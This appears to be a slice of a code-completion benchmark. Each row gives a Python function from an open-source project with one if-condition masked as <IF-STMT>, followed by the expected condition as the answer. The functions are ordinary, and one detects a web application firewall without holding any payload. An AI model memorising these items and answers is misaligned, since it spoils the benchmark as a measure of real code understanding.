3463,def is_rotated(box_list):<tab>if type(box_list) == np.ndarray:<tab><tab>return box_list.shape[1] == 5<tab>elif type(box_list) == list:<tab><tab><IF-STMT>  # cannot decide the box_dim<tab><tab><tab>return False<tab><tab>return np.all(<tab><tab><tab>np.array(<tab><tab><tab><tab>[<tab><tab><tab><tab><tab>(len(obj) == 5)<tab><tab><tab><tab><tab>and ((type(obj) == list) or (type(obj) == np.ndarray))<tab><tab><tab><tab><tab>for obj in box_list<tab><tab><tab><tab>]<tab><tab><tab>)<tab><tab>)<tab>return False,if box_list == [ ] :,167
3464,"def visit_loop(self):<tab>v = self.vS.top_front()<tab>i = self.iS.top_front()<tab>num_edges = len(self.graph[v].edges)<tab># Continue traversing out-edges until none left.<tab>while i <= num_edges:<tab><tab># Continuation<tab><tab><IF-STMT><tab><tab><tab># Update status for previously traversed out-edge<tab><tab><tab>self.finish_edge(v, i - 1)<tab><tab>if i < num_edges and self.begin_edge(v, i):<tab><tab><tab>return<tab><tab>i += 1<tab># Finished traversing out edges, update component info<tab>self.finish_visiting(v)",if i > 0 :,167
3465,"def GetConvertersByClass(value_cls):<tab>""""""Returns all converters that take given value as an input value.""""""<tab>try:<tab><tab>return ExportConverter.converters_cache[value_cls]<tab>except KeyError:<tab><tab>results = [<tab><tab><tab>cls<tab><tab><tab>for cls in ExportConverter.classes.values()<tab><tab><tab>if cls.input_rdf_type == value_cls<tab><tab>]<tab><tab><IF-STMT><tab><tab><tab>results = [DataAgnosticExportConverter]<tab><tab>ExportConverter.converters_cache[value_cls] = results<tab><tab>return results",if not results :,138
3466,"def migrate_Context(self):<tab>for old_obj in self.session_old.query(self.model_from[""Context""]):<tab><tab>new_obj = self.model_to[""Context""]()<tab><tab>for key in new_obj.__table__.columns._data.keys():<tab><tab><tab>if key not in old_obj.__table__.columns._data.keys():<tab><tab><tab><tab>continue<tab><tab><tab>value = getattr(old_obj, key)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = 0<tab><tab><tab>setattr(new_obj, key, value)<tab><tab>self.session_new.add(new_obj)","if key == ""tip_timetolive"" and value < 0 :",161
3467,"def _bind_to(self, url, bind):<tab>""""""Bind to a Connectable in the caller's thread.""""""<tab>if isinstance(bind, util.string_types + (url.URL,)):<tab><tab>try:<tab><tab><tab>self.context._engine = self.__engines[bind]<tab><tab>except KeyError:<tab><tab><tab>e = sqlalchemy.create_engine(bind)<tab><tab><tab>self.__engines[bind] = e<tab><tab><tab>self.context._engine = e<tab>else:<tab><tab># TODO: this is squirrely.  we shouldn't have to hold onto engines<tab><tab># in a case like this<tab><tab><IF-STMT><tab><tab><tab>self.__engines[bind] = bind<tab><tab>self.context._engine = bind",if bind not in self . __engines :,180
3468,"def _gen_Less(self, args, ret_type):<tab>result = []<tab>for lhs, rhs in pairwise(args):<tab><tab><IF-STMT><tab><tab><tab>result.append(self.builder.fcmp_ordered(""<"", lhs, rhs))<tab><tab>elif ret_type == int_type:<tab><tab><tab>result.append(self.builder.icmp_signed(""<"", lhs, rhs))<tab><tab>else:<tab><tab><tab>raise CompileError()<tab>return reduce(self.builder.and_, result)",if ret_type == real_type :,120
3469,"def _store_pickle_output(self, pickle_output):<tab>if pickle_output:<tab><tab><IF-STMT><tab><tab><tab>self.error(""Can't use without --output"", ""pickle-output"")<tab><tab>elif not load_pytd.is_pickle(self.output_options.output):<tab><tab><tab>self.error(<tab><tab><tab><tab>""Must specify %s file for --output"" % load_pytd.PICKLE_EXT,<tab><tab><tab><tab>""pickle-output"",<tab><tab><tab>)<tab>self.output_options.pickle_output = pickle_output",if self . output_options . output is None :,141
3470,"def resolve_identifier(self, identifier):<tab>if "":"" in identifier:<tab><tab>conn, pn = identifier.split("":"")<tab><tab><IF-STMT><tab><tab><tab>pn = int(pn)<tab><tab>return self.resolve_identifier(self.connector_table[conn][pn])<tab>else:<tab><tab>return identifier",if pn . isdigit ( ) :,75
3471,"def add_braces_and_labels(self):<tab>for attr in ""horizontal_parts"", ""vertical_parts"":<tab><tab>if not hasattr(self, attr):<tab><tab><tab>continue<tab><tab>parts = getattr(self, attr)<tab><tab>for subattr in ""braces"", ""labels"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.add(getattr(parts, subattr))","if hasattr ( parts , subattr ) :",97
3472,"def on_janitor_selection_changed(self, selection):<tab>model, iter = selection.get_selected()<tab>if iter:<tab><tab><IF-STMT><tab><tab><tab>iter = self.janitor_model.iter_children(iter)<tab><tab>plugin = model[iter][self.JANITOR_PLUGIN]<tab><tab>for row in self.result_model:<tab><tab><tab>if row[self.RESULT_PLUGIN] == plugin:<tab><tab><tab><tab>self.result_view.get_selection().select_path(row.path)<tab><tab><tab><tab>log.debug(""scroll_to_cell: %s"" % row.path)<tab><tab><tab><tab>self.result_view.scroll_to_cell(row.path)",if self . janitor_model . iter_has_child ( iter ) :,184
3473,"def canonical_standard_headers(self, headers):<tab>interesting_headers = [""content-md5"", ""content-type"", ""date""]<tab>hoi = []<tab>if ""Date"" in headers:<tab><tab>del headers[""Date""]<tab>headers[""Date""] = self._get_date()<tab>for ih in interesting_headers:<tab><tab>found = False<tab><tab>for key in headers:<tab><tab><tab>lk = key.lower()<tab><tab><tab>if headers[key] is not None and lk == ih:<tab><tab><tab><tab>hoi.append(headers[key].strip())<tab><tab><tab><tab>found = True<tab><tab><IF-STMT><tab><tab><tab>hoi.append("""")<tab>return ""\n"".join(hoi)",if not found :,172
3474,"def boolean(value):<tab>if isinstance(value, str):<tab><tab>v = value.lower()<tab><tab>if v in (""1"", ""yes"", ""true"", ""on""):<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>raise ValueError(value)<tab>return bool(value)","if v in ( ""0"" , ""no"" , ""false"" , ""off"" ) :",87
3475,"def get_extension_for_class(self, extclass):<tab>if extclass is UnrecognizedExtension:<tab><tab>raise TypeError(<tab><tab><tab>""UnrecognizedExtension can't be used with ""<tab><tab><tab>""get_extension_for_class because more than one instance of the""<tab><tab><tab>"" class may be present.""<tab><tab>)<tab>for ext in self:<tab><tab><IF-STMT><tab><tab><tab>return ext<tab>raise ExtensionNotFound(""No {} extension was found"".format(extclass), extclass.oid)","if isinstance ( ext . value , extclass ) :",126
3476,"def sysargs_to_mainargs():<tab>""""""builds main args from sys.argv""""""<tab>relative_out_dir = None<tab>if len(sys.argv) > 1 and sys.argv[1].startswith(""--""):<tab><tab>a = sys.argv.pop(1)<tab><tab><IF-STMT><tab><tab><tab>print(__doc__)<tab><tab><tab>sys.exit(1)<tab><tab>elif a.startswith(""--reldir=""):<tab><tab><tab>relative_out_dir = a[len(""--reldir="") :]<tab><tab>else:<tab><tab><tab>print(""*** Error, Unknown option:"", a)<tab><tab><tab>print(__doc__)<tab><tab><tab>sys.exit(1)<tab>other_session = sys.argv[1]<tab>return relative_out_dir, other_session","if a . startswith ( ""--help"" ) :",181
3477,"def _scanDirectory(self, dirIter, f):<tab>while len(f) < 250:<tab><tab>try:<tab><tab><tab>info = next(dirIter)<tab><tab>except StopIteration:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise EOFError<tab><tab><tab>return f<tab><tab>if isinstance(info, defer.Deferred):<tab><tab><tab>info.addCallback(self._cbScanDirectory, dirIter, f)<tab><tab><tab>return<tab><tab>else:<tab><tab><tab>f.append(info)<tab>return f",if not f :,122
3478,"def register_options(config_block):<tab>for name in common_block:<tab><tab>safe_declare_common_option(config_block, name)<tab><tab><IF-STMT><tab><tab><tab>config_block.get(name).declare_as_argument()",if config_block . get ( name ) . _argparse is None :,70
3479,"def _loc(obj):<tab>try:<tab><tab>fn = getattr(obj, ""__file__"", None)<tab><tab><IF-STMT><tab><tab><tab>return "" @%s"" % (fn,)<tab><tab>obj = getattr(obj, ""im_func"", obj)<tab><tab>code = getattr(obj, ""__code__"", None)<tab><tab>if code is not None:<tab><tab><tab>return "" @%s:%s"" % (code.co_filename, code.co_firstlineno)<tab>except Exception:<tab><tab>pass<tab>return """"",if fn is not None :,126
3480,"def _remove_temporary_files(self, temporary_files):<tab>""""""Internal function for cleaning temporary files""""""<tab>for file_object in temporary_files:<tab><tab>file_name = file_object.name<tab><tab>file_object.close()<tab><tab><IF-STMT><tab><tab><tab>os.remove(file_name)<tab><tab>arff_file_name = file_name + "".arff""<tab><tab>if os.path.exists(arff_file_name):<tab><tab><tab>os.remove(arff_file_name)",if os . path . exists ( file_name ) :,129
3481,"def show(self):<tab>""""""Overrides Qt Method""""""<tab>QWidget.show(self)<tab>self.emit(SIGNAL(""visibility_changed(bool)""), True)<tab>if self.editor is not None:<tab><tab>text = self.editor.get_selected_text()<tab><tab><IF-STMT><tab><tab><tab>self.search_text.setEditText(text)<tab><tab><tab>self.search_text.lineEdit().selectAll()<tab><tab><tab>self.refresh()<tab><tab>else:<tab><tab><tab>self.search_text.lineEdit().selectAll()<tab><tab>self.search_text.setFocus()",if len ( text ) > 0 :,150
3482,"def flush_input() -> None:<tab>if not self.is_done:<tab><tab># Get keys, and feed to key processor.<tab><tab>keys = self.input.flush_keys()<tab><tab>self.key_processor.feed_multiple(keys)<tab><tab>self.key_processor.process_keys()<tab><tab><IF-STMT><tab><tab><tab>f.set_exception(EOFError)",if self . input . closed :,95
3483,"def get_default_taxes_and_charges(master_doctype, tax_template=None, company=None):<tab>if not company:<tab><tab>return {}<tab>if tax_template and company:<tab><tab>tax_template_company = frappe.db.get_value(<tab><tab><tab>master_doctype, tax_template, ""company""<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return<tab>default_tax = frappe.db.get_value(<tab><tab>master_doctype, {""is_default"": 1, ""company"": company}<tab>)<tab>return {<tab><tab>""taxes_and_charges"": default_tax,<tab><tab>""taxes"": get_taxes_and_charges(master_doctype, default_tax),<tab>}",if tax_template_company == company :,182
3484,"def dump_prefs(self):<tab>ret = """"<tab>for pref in self.prefs:<tab><tab>if type(self.prefs[pref].value) == int:<tab><tab><tab>value = str(self.prefs[pref].value)<tab><tab><IF-STMT><tab><tab><tab>value = ""true"" if self.prefs[pref].value == True else ""false""<tab><tab>else:<tab><tab><tab>value = '""%s""' % self.prefs[pref].value<tab><tab>ret += pref + "": "" + value + "" ("" + self.prefs[pref].anon_source + "")\n""<tab>return ret",elif type ( self . prefs [ pref ] . value ) == bool :,150
3485,"def dumps(o, **kwargs):<tab>""""""Dumps JSON object.""""""<tab>try:<tab><tab>return _engine[1](o)<tab>except:<tab><tab>ExceptionClass, why = sys.exc_info()[:2]<tab><tab><IF-STMT><tab><tab><tab>raise JSONError(why)<tab><tab>else:<tab><tab><tab>raise why","if any ( [ ( issubclass ( ExceptionClass , e ) ) for e in _engine [ 2 ] ] ) :",95
3486,"def main():<tab>import sys, getopt<tab>try:<tab><tab>opts, args = getopt.getopt(sys.argv[1:], ""ho:"", [""help"", ""output=""])<tab>except getopt.GetoptError as err:<tab><tab>usage()<tab><tab>sys.exit(1)<tab>output = None<tab>for o, a in opts:<tab><tab><IF-STMT><tab><tab><tab>usage()<tab><tab><tab>sys.exit()<tab><tab>elif o in (""-o"", ""--output""):<tab><tab><tab>output = a<tab><tab>else:<tab><tab><tab>usage()<tab><tab><tab>sys.exit(1)<tab>if not args:<tab><tab>usage()<tab><tab>sys.exit(1)<tab>concat_flv(args, output)","if o in ( ""-h"" , ""--help"" ) :",175
3487,"def close_group(self):<tab>""""""Closes a grouping for previous filters""""""<tab>if self._filters:<tab><tab>if len(self._open_group_flag) < (len(self._close_group_flag) + 1):<tab><tab><tab>raise RuntimeError(""Not enough open groups to close."")<tab><tab><IF-STMT><tab><tab><tab>flt_sentence = self._filters[-2]<tab><tab>else:<tab><tab><tab>flt_sentence = self._filters[-1]<tab><tab>flt_sentence[1] = flt_sentence[1] + "")""  # closing the group<tab><tab>self._close_group_flag.append(False)  # flag a close group was added<tab>else:<tab><tab>raise RuntimeError(""No filters present. Can't close a group"")<tab>return self","if isinstance ( self . _filters [ - 1 ] , ChainOperator ) :",191
3488,"def _GetPlugins(self, base_class):<tab>items = []<tab>for name in sorted(base_class.classes.keys()):<tab><tab>cls = base_class.classes[name]<tab><tab># While technically a valid plugin, UnknownOutputPlugin is only used as<tab><tab># a placeholder when unserializing old and now-deleted output plugins.<tab><tab># No need to display it in the UI.<tab><tab>if cls == output_plugin.UnknownOutputPlugin:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>items.append(ApiOutputPluginDescriptor().InitFromOutputPluginClass(cls))<tab>return items",if cls . description :,145
3489,"def _set_helper(settings, path, value, data_type=None):<tab>path = _to_settings_path(path)<tab>method = settings.set<tab>if data_type is not None:<tab><tab>name = None<tab><tab>if data_type == bool:<tab><tab><tab>name = ""setBoolean""<tab><tab>elif data_type == float:<tab><tab><tab>name = ""setFloat""<tab><tab>elif data_type == int:<tab><tab><tab>name = ""setInt""<tab><tab><IF-STMT><tab><tab><tab>method = getattr(settings, name)<tab>method(path, value)<tab>settings.save()",if name is not None :,150
3490,"def _url_encode_impl(obj, charset, encode_keys, sort, key):<tab>iterable = sdict()<tab>for key, values in obj.items():<tab><tab>if not isinstance(values, list):<tab><tab><tab>values = [values]<tab><tab>iterable[key] = values<tab>if sort:<tab><tab>iterable = sorted(iterable, key=key)<tab>for key, values in iterable.items():<tab><tab>for value in values:<tab><tab><tab>if value is None:<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>key = str(key).encode(charset)<tab><tab><tab>if not isinstance(value, bytes):<tab><tab><tab><tab>value = str(value).encode(charset)<tab><tab><tab>yield url_quote_plus(key) + ""="" + url_quote_plus(value)","if not isinstance ( key , bytes ) :",198
3491,"def validate_data(self, data, schema):<tab>verrors = ValidationErrors()<tab>provider = data[""provider""]<tab>if provider == ""custom"":<tab><tab>for k in (""custom_ddns_server"", ""custom_ddns_path""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>verrors.add(f""{schema}.{k}"", ""Required when using a custom provider."")<tab>elif provider not in (await self.provider_choices()):<tab><tab>verrors.add(f""{schema}.provider"", ""Please select a valid provider."")<tab>verrors.check()",if not data [ k ] :,138
3492,"def render(self):<tab>x = ""<span>""<tab>for idx, arg in enumerate(self.args, start=1):<tab><tab><IF-STMT><tab><tab><tab>value, desc = arg<tab><tab>else:<tab><tab><tab>value, desc = arg, arg<tab><tab>attrs = self.attrs.copy()<tab><tab>attrs[""name""] = self.name<tab><tab>attrs[""type""] = ""radio""<tab><tab>attrs[""value""] = value<tab><tab>attrs[""id""] = self.name + str(idx)<tab><tab>if self.value == value:<tab><tab><tab>attrs[""checked""] = ""checked""<tab><tab>x += ""<input %s/> %s"" % (attrs, net.websafe(desc))<tab>x += ""</span>""<tab>return x","if isinstance ( arg , ( tuple , list ) ) :",183
3493,"def search_rotate(array, val):<tab>low, high = 0, len(array) - 1<tab>while low <= high:<tab><tab>mid = (low + high) // 2<tab><tab><IF-STMT><tab><tab><tab>return mid<tab><tab>if array[low] <= array[mid]:<tab><tab><tab>if array[low] <= val <= array[mid]:<tab><tab><tab><tab>high = mid - 1<tab><tab><tab>else:<tab><tab><tab><tab>low = mid + 1<tab><tab>else:<tab><tab><tab>if array[mid] <= val <= array[high]:<tab><tab><tab><tab>low = mid + 1<tab><tab><tab>else:<tab><tab><tab><tab>high = mid - 1<tab>return -1",if val == array [ mid ] :,166
3494,"def detect(get_page):<tab>retval = False<tab>for vector in WAF_ATTACK_VECTORS:<tab><tab>page, headers, code = get_page(get=vector)<tab><tab>retval = (<tab><tab><tab>re.search(<tab><tab><tab><tab>r""wangzhan\.360\.cn"", headers.get(""X-Powered-By-360wzb"", """"), re.I<tab><tab><tab>)<tab><tab><tab>is not None<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>break<tab>return retval",if retval :,125
3495,"def _recalculate(self):<tab># If the parent's path has changed, recalculate _path<tab>parent_path = tuple(self._get_parent_path())  # Make a copy<tab>if parent_path != self._last_parent_path:<tab><tab>spec = self._path_finder(self._name, parent_path)<tab><tab># Note that no changes are made if a loader is returned, but we<tab><tab>#  do remember the new parent path<tab><tab><IF-STMT><tab><tab><tab>if spec.submodule_search_locations:<tab><tab><tab><tab>self._path = spec.submodule_search_locations<tab><tab>self._last_parent_path = parent_path  # Save the copy<tab>return self._path",if spec is not None and spec . loader is None :,174
3496,"def _get_directory_item_content(filename, return_binary, encoding):<tab>content = None<tab>if os.path.exists(filename):<tab><tab><IF-STMT><tab><tab><tab>mode = ""rb""<tab><tab><tab>encoding = None<tab><tab>else:<tab><tab><tab>mode = ""r""<tab><tab>with codecs.open(filename, mode, encoding=encoding) as file_obj:<tab><tab><tab>content = file_obj.read()<tab>return content",if return_binary :,110
3497,"def randint(self, beg, end):<tab>if beg == 1 and end == 10:<tab><tab>self.icnt1_10 += 1<tab><tab><IF-STMT><tab><tab><tab>self.icnt1_10 = 1<tab><tab>return self.RINT1_10[self.icnt1_10 - 1]<tab>if beg == 65 and end == 90:<tab><tab>self.icnt65_90 += 1<tab><tab>if self.icnt65_90 > len(self.RINT65_90):<tab><tab><tab>self.icnt65_90 = 1<tab><tab>return self.RINT65_90[self.icnt65_90 - 1]<tab>raise Exception(""Not implemented"")",if self . icnt1_10 > len ( self . RINT1_10 ) :,178
3498,"def _get_two_devices(self, require_same_type=False):<tab>tpus = extensions.tpu_devices()<tab>if FLAGS.requires_tpu:<tab><tab><IF-STMT><tab><tab><tab>res = tpus<tab><tab>else:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""This test requires 2 TPU cores but %s are found"" % len(tpus)<tab><tab><tab>)<tab>else:<tab><tab>if len(tpus) == 2:<tab><tab><tab>res = tpus<tab><tab>elif self._hasGPU() and not require_same_type:<tab><tab><tab>res = (""CPU:0"", ""GPU:0"")<tab><tab>else:<tab><tab><tab>res = (""CPU:0"", ""CPU:1"")<tab>return res",if len ( tpus ) == 2 :,184
3499,"def edge2str(self, nfrom, nto):<tab>if isinstance(nfrom, ExprCompose):<tab><tab>for i in nfrom.args:<tab><tab><tab>if i[0] == nto:<tab><tab><tab><tab>return ""[%s, %s]"" % (i[1], i[2])<tab>elif isinstance(nfrom, ExprCond):<tab><tab>if nfrom.cond == nto:<tab><tab><tab>return ""?""<tab><tab><IF-STMT><tab><tab><tab>return ""True""<tab><tab>elif nfrom.src2 == nto:<tab><tab><tab>return ""False""<tab>return """"",elif nfrom . src1 == nto :,149
3500,"def send_frame_imm(self, frame):<tab># send s_frame<tab>if frame.name == ""s_frame"":<tab><tab>frame.RecvSeq = self.rsn<tab><tab><IF-STMT><tab><tab><tab>gevent.kill(self.t2_caller)<tab><tab>self.telegram_count = 0<tab><tab>response_string = "" "".join(hex(n) for n in frame.build())<tab><tab>logger.info(<tab><tab><tab>""%s <--- s_frame %s  (%s)"", self.address, response_string, self.session_id<tab><tab>)<tab><tab>return self.sock.send(frame.build())",if self . t2_caller :,157
3501,"def lin2lin(cp, size, size2):<tab>_check_params(len(cp), size)<tab>_check_size(size2)<tab>if size == size2:<tab><tab>return cp<tab>new_len = (len(cp) / size) * size2<tab>result = create_string_buffer(new_len)<tab>for i in range(_sample_count(cp, size)):<tab><tab>sample = _get_sample(cp, size, i)<tab><tab>if size < size2:<tab><tab><tab>sample = sample << (4 * size2 / size)<tab><tab><IF-STMT><tab><tab><tab>sample = sample >> (4 * size / size2)<tab><tab>sample = _overflow(sample, size2)<tab><tab>_put_sample(result, size2, i, sample)<tab>return result.raw",elif size > size2 :,197
3502,"def tangent(self, t):<tab>result = np.array([0, 0, 0])<tab>o = self.omega<tab>for i, coeff in enumerate(self.coeffs):<tab><tab>j = i // 2<tab><tab><IF-STMT><tab><tab><tab>result += -(j + 1) * o * coeff * sin((j + 1) * o * t)<tab><tab>else:<tab><tab><tab>result += (j + 1) * o * coeff * cos((j + 1) * o * t)<tab>return result",if i % 2 == 0 :,126
3503,"def _run(self):<tab>when_pressed = 0.0<tab>pressed = False<tab>while not self._done.is_set():<tab><tab>now = time.monotonic()<tab><tab><IF-STMT><tab><tab><tab>if GPIO.input(self._channel) == self._expected:<tab><tab><tab><tab>if not pressed:<tab><tab><tab><tab><tab>pressed = True<tab><tab><tab><tab><tab>when_pressed = now<tab><tab><tab><tab><tab>self._trigger(self._pressed_queue, self._pressed_callback)<tab><tab><tab>else:<tab><tab><tab><tab>if pressed:<tab><tab><tab><tab><tab>pressed = False<tab><tab><tab><tab><tab>self._trigger(self._released_queue, self._released_callback)<tab><tab>self._done.wait(0.05)",if now - when_pressed > self . _debounce_time :,187
3504,"def check_dimensions(nrow, ncol):<tab>if nrow is not None:<tab><tab>if nrow < 1:<tab><tab><tab>warn(<tab><tab><tab><tab>""'nrow' must be greater than 0. "" ""Your value has been ignored."",<tab><tab><tab><tab>PlotnineWarning,<tab><tab><tab>)<tab><tab><tab>nrow = None<tab><tab>else:<tab><tab><tab>nrow = int(nrow)<tab>if ncol is not None:<tab><tab><IF-STMT><tab><tab><tab>warn(<tab><tab><tab><tab>""'ncol' must be greater than 0. "" ""Your value has been ignored."",<tab><tab><tab><tab>PlotnineWarning,<tab><tab><tab>)<tab><tab><tab>ncol = None<tab><tab>else:<tab><tab><tab>ncol = int(ncol)<tab>return nrow, ncol",if ncol < 1 :,189
3505,"def visit_FunctionDef(self, node: ast.FunctionDef) -> None:<tab>""""""Handles FunctionDef node and set context.""""""<tab>if self.current_function is None:<tab><tab>self.add_entry(<tab><tab><tab>node.name<tab><tab>)  # should be called before setting self.current_function<tab><tab><IF-STMT><tab><tab><tab>self.add_final_entry(node.name)<tab><tab>if self.is_overload(node.decorator_list):<tab><tab><tab>self.add_overload_entry(node)<tab><tab>self.context.append(node.name)<tab><tab>self.current_function = node<tab><tab>for child in node.body:<tab><tab><tab>self.visit(child)<tab><tab>self.context.pop()<tab><tab>self.current_function = None",if self . is_final ( node . decorator_list ) :,196
3506,"def ret(stmt, params=()):<tab>match = limit_re.match(stmt)<tab>if match:<tab><tab><IF-STMT><tab><tab><tab>n = params[-1]<tab><tab><tab>params = params[:-1]<tab><tab>else:<tab><tab><tab>n = int(match.group(2))<tab><tab>store.sql(match.group(1), params)<tab><tab>return [store.cursor.fetchone() for i in xrange(n)]<tab>return selectall(stmt, params)","if match . group ( 2 ) == ""?"" :",119
3507,"def OnBodyClick(self, event=None):<tab>try:<tab><tab>c = self.c<tab><tab>p = c.currentPosition()<tab><tab><IF-STMT><tab><tab><tab>self.OnActivateBody(event=event)<tab><tab><tab>c.k.showStateAndMode(w=c.frame.body.bodyCtrl)<tab><tab>g.doHook(""bodyclick2"", c=c, p=p, v=p, event=event)<tab>except:<tab><tab>g.es_event_exception(""bodyclick"")","if not g . doHook ( ""bodyclick1"" , c = c , p = p , v = p , event = event ) :",148
3508,"def verify_settings(rst_path: Path) -> Iterator[Error]:<tab>for setting_name, default in find_settings_in_rst(rst_path):<tab><tab>actual = getattr(app.conf, setting_name)<tab><tab>if isinstance(default, timedelta):<tab><tab><tab>default = default.total_seconds()<tab><tab><IF-STMT><tab><tab><tab>actual = actual.value<tab><tab>if actual != default:<tab><tab><tab>yield Error(<tab><tab><tab><tab>reason=""mismatch"",<tab><tab><tab><tab>setting=setting_name,<tab><tab><tab><tab>default=default,<tab><tab><tab><tab>actual=actual,<tab><tab><tab>)","if isinstance ( actual , Enum ) :",152
3509,"def fromVariant(variant):<tab>if hasattr(QtCore, ""QVariant"") and isinstance(variant, QtCore.QVariant):<tab><tab>t = variant.type()<tab><tab>if t == QtCore.QVariant.String:<tab><tab><tab>return str(variant.toString())<tab><tab>elif t == QtCore.QVariant.Double:<tab><tab><tab>return variant.toDouble()[0]<tab><tab><IF-STMT><tab><tab><tab>return variant.toInt()[0]<tab><tab>elif t == QtCore.QVariant.Bool:<tab><tab><tab>return variant.toBool()<tab><tab>elif t == QtCore.QVariant.Invalid:<tab><tab><tab>return None<tab><tab>else:<tab><tab><tab>raise ValueError('Unsupported QVariant type ""%s""' % variant.typeName())<tab>else:<tab><tab>return variant",elif t == QtCore . QVariant . Int :,195
3510,"def decode_list(self, prop, value):<tab>if not isinstance(value, list):<tab><tab>value = [value]<tab>if hasattr(prop, ""item_type""):<tab><tab>item_type = getattr(prop, ""item_type"")<tab><tab>dec_val = {}<tab><tab>for val in value:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>k, v = self.decode_map_element(item_type, val)<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>k = int(k)<tab><tab><tab><tab>except:<tab><tab><tab><tab><tab>k = v<tab><tab><tab><tab>dec_val[k] = v<tab><tab>value = dec_val.values()<tab>return value",if val is not None :,170
3511,"def has_valid_checksum(self, number):<tab>given_number, given_checksum = number[:-1], number[-1]<tab>calculated_checksum = 0<tab>parameter = 7<tab>for item in given_number:<tab><tab>fragment = str(int(item) * parameter)<tab><tab>if fragment.isalnum():<tab><tab><tab>calculated_checksum += int(fragment[-1])<tab><tab>if parameter == 1:<tab><tab><tab>parameter = 7<tab><tab><IF-STMT><tab><tab><tab>parameter = 1<tab><tab>elif parameter == 7:<tab><tab><tab>parameter = 3<tab>return str(calculated_checksum)[-1] == given_checksum",elif parameter == 3 :,147
3512,"def encoder(s, *args, **kwargs):<tab>r = []<tab>_in = []<tab>for c in s:<tab><tab>if ord(c) in PRINTABLE:<tab><tab><tab>doB64(_in, r)<tab><tab><tab>r.append(c.encode())<tab><tab><IF-STMT><tab><tab><tab>doB64(_in, r)<tab><tab><tab>r.append(b""&-"")<tab><tab>else:<tab><tab><tab>_in.append(c)<tab>doB64(_in, r)<tab>return (b"""".join(r), len(s))","elif c == ""&"" :",137
3513,"def construct_instances(self, row, keys=None):<tab>collected_models = {}<tab>for i, (key, constructor, attr, conv) in enumerate(self.column_map):<tab><tab>if keys is not None and key not in keys:<tab><tab><tab>continue<tab><tab>value = row[i]<tab><tab>if key not in collected_models:<tab><tab><tab>collected_models[key] = constructor()<tab><tab>instance = collected_models[key]<tab><tab>if attr is None:<tab><tab><tab>attr = self.cursor.description[i][0]<tab><tab><IF-STMT><tab><tab><tab>value = conv(value)<tab><tab>setattr(instance, attr, value)<tab>return collected_models",if conv is not None :,167
3514,"def try_to_find_osquery(self):<tab>extention = """"<tab><IF-STMT><tab><tab>extention = "".exe""<tab>try:<tab><tab>return resources.get_resource(""osqueryi"" + extention)<tab>except IOError as e:<tab><tab># Maybe it is installed on the system.<tab><tab>if platform.system() == ""Windows"":<tab><tab><tab>result = r""c:\ProgramData\osquery\osqueryi.exe""<tab><tab><tab>if os.access(result, os.R_OK):<tab><tab><tab><tab>return result<tab><tab>else:<tab><tab><tab># Try to find it somewhere on the system.<tab><tab><tab>return spawn.find_executable(""osqueryi"")<tab><tab>raise e","if platform . system ( ) == ""Windows"" :",178
3515,"def get_cached_stats(self, split=tfds.Split.TRAIN):<tab>""""""Returns basic statistics for cached dataset.""""""<tab>self.assert_cached()<tab>if split not in self._stats:<tab><tab>stats_path = get_stats_path(self.cache_dir, split)<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""Stats do not exist for '%s' split: %s"" % (self.name, split)<tab><tab><tab>)<tab><tab>with tf.io.gfile.GFile(stats_path) as f:<tab><tab><tab>self._stats[split] = json.load(f)<tab>return self._stats[split]",if not tf . io . gfile . exists ( stats_path ) :,169
3516,"def _network_connections_in_results(data):<tab>for plugin_name, plugin_result in data.iteritems():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if ""device"" not in plugin_result:<tab><tab><tab>continue<tab><tab>if ""connections"" in plugin_result[""device""]:<tab><tab><tab>for conn in plugin_result[""device""][""connections""]:<tab><tab><tab><tab>if conn[""connection_type""] == ConnectionType.network.name:<tab><tab><tab><tab><tab>return True<tab>return False","if plugin_result [ ""status"" ] == ""error"" :",126
3517,"def register_asyncio_task(self, task, module_path=None):<tab>if self._current[""metadata""] is None:<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(""module_path must be supplied for late-binded tasks"")<tab><tab>else:<tab><tab><tab>self.list[module_path][""asyncio.task""].append(task)<tab>else:<tab><tab>self._current[""asyncio.task""].append(task)",if module_path is None :,105
3518,"def __prep_write_total(self, comments, main, fallback, single):<tab>lower = self.as_lowercased()<tab>for k in [main, fallback, single]:<tab><tab>if k in comments:<tab><tab><tab>del comments[k]<tab>if single in lower:<tab><tab>parts = lower[single].split(""/"", 1)<tab><tab>if parts[0]:<tab><tab><tab>comments[single] = [parts[0]]<tab><tab><IF-STMT><tab><tab><tab>comments[main] = [parts[1]]<tab>if main in lower:<tab><tab>comments[main] = lower.list(main)<tab>if fallback in lower:<tab><tab>if main in comments:<tab><tab><tab>comments[fallback] = lower.list(fallback)<tab><tab>else:<tab><tab><tab>comments[main] = lower.list(fallback)",if len ( parts ) > 1 :,196
3519,"def api(request, app):<tab>marker = request.keywords.get(""api"")<tab>bpkwargs = {}<tab>kwargs = {}<tab>if marker:<tab><tab><IF-STMT><tab><tab><tab>bpkwargs[""url_prefix""] = marker.kwargs.pop(""prefix"")<tab><tab>if ""subdomain"" in marker.kwargs:<tab><tab><tab>bpkwargs[""subdomain""] = marker.kwargs.pop(""subdomain"")<tab><tab>kwargs = marker.kwargs<tab>blueprint = Blueprint(""api"", __name__, **bpkwargs)<tab>api = restplus.Api(blueprint, **kwargs)<tab>app.register_blueprint(blueprint)<tab>yield api","if ""prefix"" in marker . kwargs :",157
